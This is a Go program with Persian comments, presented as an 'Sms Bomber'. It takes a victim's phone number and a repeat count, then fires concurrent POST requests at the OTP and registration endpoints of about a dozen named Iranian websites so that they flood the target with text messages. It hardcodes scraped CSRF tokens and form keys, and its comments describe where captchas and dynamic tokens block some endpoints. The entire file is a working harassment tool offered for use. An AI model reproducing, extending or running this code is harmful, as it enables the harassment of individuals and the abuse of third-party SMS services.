package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io" // اضافه کردن پکیج io برای خواندن بدنه پاسخ
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			select {
			case <-time.After(retryDelay):
			case <-ctx.Done():
				fmt.Printf("\033[01;33m[!] Request to %s canceled during sleep.\033[0m\n", url)
				ch <- 0
				return
			}
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			select {
			case <-time.After(retryDelay):
			case <-ctx.Done():
				fmt.Printf("\033[01;33m[!] Request to %s canceled during sleep.\033[0m\n", url)
				ch <- 0
				return
			}
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				select {
				case <-time.After(retryDelay):
				case <-ctx.Done():
					fmt.Printf("\033[01;33m[!] Request to %s canceled during sleep.\033[0m\n", url)
					ch <- 0
					return
				}
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- Start Debugging Code ---
		// Request completed without network error. Check status code.
		if resp.StatusCode >= 400 {
			fmt.Printf("\033[01;31m[-] Server responded with error for %s: Status Code %d\033[0m\n", url, resp.StatusCode)
			// Attempt to read the response body for more details
			bodyBytes, readErr := io.ReadAll(resp.Body)
			resp.Body.Close() // Always close the body after attempting to read
			if readErr != nil {
				fmt.Printf("\033[01;31m[-] Could not read response body for %s: %v\033[0m\n", url, readErr)
			} else {
				// Print body as string. Be cautious with large/binary responses.
				// limit body print size to avoid flooding the console
				bodyStr := string(bodyBytes)
				if len(bodyStr) > 500 { // print only first 500 chars if very long
					bodyStr = bodyStr[:500] + "..."
				}
				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, bodyStr)
			}
			// Send the error status code. No retry for server-side errors (>= 400).
			ch <- resp.StatusCode
			return // Done with this API call, it failed with a server response
		} else {
		// --- End Debugging Code ---

			// Successful status code (e.g., 200-399)
			ch <- resp.StatusCode
			resp.Body.Close() // Close the body for successful responses
			return // Done with this API call, it was successful
		}
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			select {
			case <-time.After(retryDelay):
			case <-ctx.Done():
				fmt.Printf("\033[01;33m[!] Request to %s canceled during sleep.\033[0m\n", url)
				ch <- 0
				return
			}
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				select {
				case <-time.After(retryDelay):
				case <-ctx.Done():
					fmt.Printf("\033[01;33m[!] Request to %s canceled during sleep.\033[0m\n", url)
					ch <- 0
					return
				}
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- Start Debugging Code ---
		// Request completed without network error. Check status code.
		if resp.StatusCode >= 400 {
			fmt.Printf("\033[01;31m[-] Server responded with error for %s: Status Code %d\033[0m\n", url, resp.StatusCode)
			// Attempt to read the response body for more details
			bodyBytes, readErr := io.ReadAll(resp.Body)
			resp.Body.Close() // Always close the body after attempting to read
			if readErr != nil {
				fmt.Printf("\033[01;31m[-] Could not read response body for %s: %v\033[0m\n", url, readErr)
			} else {
				// Print body as string, limit size
				bodyStr := string(bodyBytes)
				if len(bodyStr) > 500 {
					bodyStr = bodyStr[:500] + "..."
				}
				fmt.Printf("\033[01;31m[-] Response Body for %s: %s\033[0m\n", url, bodyStr)
			}
			// Send the error status code. No retry for server-side errors (>= 400).
			ch <- resp.StatusCode
			return // Done with this API call, it failed with a server response
		} else {
		// --- End Debugging Code ---

			// Successful status code
			ch <- resp.StatusCode
			resp.Body.Close() // Close the body
			return // Done with this API call, it was successful
		}
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// ---- ایجاد Context با مهلت زمانی کلی ----
	timeoutDuration := 5 * time.Minute // مهلت زمانی کلی (قابل تنظیم)
	// ایجاد Context اصلی که با Ctrl+C یا رسیدن به مهلت زمانی لغو میشود
	ctx, cancel := context.WithTimeout(context.WithCancel(context.Background()), timeoutDuration)
	defer cancel() // مطمئن میشویم که cancel در پایان main فراخوانی میشود


	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	// Goroutine برای دریافت سیگنال و لغو Context
	go func() {
		select {
		case <-signalChan:
			fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
			cancel() // لغو Context توسط سیگنال
		case <-ctx.Done():
			// Context به دلیل timeout یا دلیل دیگر لغو شده، این goroutine هم خارج میشود.
		}
	}()

	// کانالی برای ارسال کارها به Workerها
	tasks := make(chan func(), repeatCount*40)
	// تعداد Goroutineهای کارگر
	numWorkers := 20

	var wg sync.WaitGroup
	// کانال برای دریافت وضعیت‌ها (کدهای وضعیت HTTP یا 0 برای لغو)
	ch := make(chan int, repeatCount*40)

	// ایجاد و اجرای Goroutineهای کارگر
	// هر کارگر از کانال tasks میخونه و تابع task() رو اجرا میکنه تا زمانی که کانال بسته بشه و خالی بشه یا Context لغو بشه
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				select {
				case <-ctx.Done():
					return // خروج کارگر در صورت لغو Context
				default:
					task() // اجرای وظیفه
				}
			}
		}()
	}

	// Goroutine برای تعریف و ارسال کارها به کانال tasks
	go func() {
		for i := 0; i < repeatCount; i++ {
			select {
			case <-ctx.Done():
				fmt.Println("\033[01;33m[!] Task dispatching canceled.\033[0m")
				goto endOfDispatch // پرش به برچسب endOfDispatch در صورت لغو Context
			default:
				// ادامه ارسال وظایف
			}

			// ---- لیست API ها (بر اساس لیست قبلی شما) ----

			// 1. api.achareh.co (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}

			// 2. itmall.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone)
				formData.Set("csrf", "e57d035242") // ⚠️ توجه: این توکن ممکن است داینامیک باشد
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "") // ⚠️ توجه: ممکن است نیاز به حل کپچا داشته باشد
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}

			// 3. api.mootanroo.com (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
					"PhoneNumber": phone,
				}, &wg, ch)
			}

			// 4. accounts.khanoumi.com (Form) - ساختار payload شبیه Form Data است.
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") // ⚠️ ممکن است نیاز به تولید دینامیک داشته باشد
				formData.Set("loginIdentifier", phone)
				formData.Set("loginSchemeName", "sms")
				sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
			}

			// 5. api.timcheh.com (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
					"mobile": phone,
				}, &wg, ch)
			}

			// 6. modiseh.com (Form) - نیاز به توکن های داینامیک و احتمالاً کپچا دارد.
			// این API بدون پیاده سازی مکانیزم استخراج form_key, referer و حل کپچا از صفحه وب کار نخواهد کرد.
			// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد.
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("otp_code", "")
				formData.Set("login[username]", "")
				formData.Set("username", phone)
				formData.Set("pass", "")
				formData.Set("my_pass", "")
				formData.Set("is_force_login", "")
				formData.Set("customer_set_password", "")
				formData.Set("customer_set_password2", "")
				formData.Set("form_key", "NtheYMn1kIgW0qqQ") // ⚠️ داینامیک
				formData.Set("type", "enter_mobile")
				formData.Set("captcha[user_login]", "123456") // ⚠️ کپچا
				formData.Set("referer", "aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v") // ⚠️ داینامیک (Base64 encoded URL)
				formData.Set("otp_token", "")
				sendFormRequest(ctx, "https://www.modiseh.com/customer/account/loginpost/", formData, &wg, ch)
			}

			// 7. shixon.com (Form) - نیاز به توکن __RequestVerificationToken داینامیک دارد.
			// این API بدون پیاده سازی مکانیزم استخراج __RequestVerificationToken از صفحه وب کار نخواهد کرد.
			// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد. فیلد "P" هم مشکوک است.
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("M", phone)
				formData.Set("P", "123456789") // ⚠️ مشکوک
				formData.Set("s", "888")
				formData.Set("PU", "")
				formData.Set("__RequestVerificationToken", "3otZwhYPKHgFR1b-1dRGDdyKPJNqaPhyqOB1AFP5YM5mg1PDbeFfMxqn_kKN3yTp3qRlXKh9f13F1jfvWzs0ZUxTOTp9jQPRTHh2jqV_FeE1") // ⚠️ داینامیک
				sendFormRequest(ctx, "https://www.shixon.com/Home/RegisterUser", formData, &wg, ch)
			}

			// 8. dast2.com (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://dast2.com/token", map[string]interface{}{
					"cellphone": phone,
				}, &wg, ch)
			}

			// 9. api.esam.ir (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://api.esam.ir/api/account/v3/RegisterUserv3", map[string]interface{}{
					"mobile": phone,
					"present_type": "WebApp",
					"registration_method": 0,
					"serialNumber": "", // ⚠️ ممکن است نیاز به مقدار دیگری باشد یا کلا نباید ارسال شود اگر خالی است
				}, &wg, ch)
			}

			// 10. mobapi.banimode.com (JSON)
			wg.Add(1)
			tasks <- func() {
				sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}

			// 11. lioncomputer.com (Form) - خطای Redirect میدهد.
			// این URL به احتمال زیاد نقطه پایانی صحیح برای دریافت مستقیم درخواست POST با این Payload نیست
			// یا نیاز به هدرهای خاصی دارد که باعث عدم Redirect شود.
			// ⚠️ این مورد نیاز به بررسی دقیق جریان لاگین در سایت و یافتن نقطه پایانی صحیح API دارد.
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("redirect_url", "https://www.lioncomputer.com")
				sendFormRequest(ctx, "https://www.lioncomputer.com/api/v1/auth/send-register-code", formData, &wg, ch)
			}

			// 12. account.bama.ir (Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("username", phone)
				formData.Set("client_id", "popuplogin")
				sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
			}

			// ---- در صورت تمایل API های دیگری که قبلا کار می کردند را اینجا اضافه کنید ----
			// مثلا:
			// wg.Add(1)
			// tasks <- func() {
			// 	sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			// 		"PhoneNo": phone,
			// 	}, &wg, ch)
			// }


		} // پایان select
	} // پایان حلقه repeatCount

	endOfDispatch: // برچسب برای پرش goto
		close(tasks) // بستن کانال tasks بعد از ارسال همه کارها یا لغو شدن context


	// Goroutine برای انتظار برای اتمام کار Worker ها (wg.Wait) یا لغو Context
	go func() {
		// ایجاد یک کانال کمکی برای اینکه wg.Wait() مسدود کننده را در select قرار ندهیم
		waitDone := make(chan struct{})
		go func() {
			wg.Wait()
			close(waitDone) // بستن کانال وقتی wg.Wait() تمام شد
		}()

		// منتظر لغو Context یا اتمام wg.Wait() می مانیم
		select {
		case <-ctx.Done():
			fmt.Println("\033[01;33m[!] Waiting for WaitGroup interrupted by context.\033[0m")
		case <-waitDone:
			fmt.Println("\033[01;32m[+] All tasks finished.\033[0m")
		}

		// بستن کانال نتایج (ch) بعد از اتمام همه کارها یا لغو Context
		close(ch)
	}()

	// پردازش کدهای وضعیت دریافت شده از کانال ch
	fmt.Println("\033[01;34m[*] Processing results...\033[0m")
	// این حلقه تا زمانی که کانال ch باز و خالی نیست، ادامه می یابد
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
			// پیغام Error یا Canceled حالا جزئیات بیشتری در صورت وجود چاپ کرده است
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}

	fmt.Println("\033[01;32m[+] Program finished.\033[0m")

} // پایان تابع main
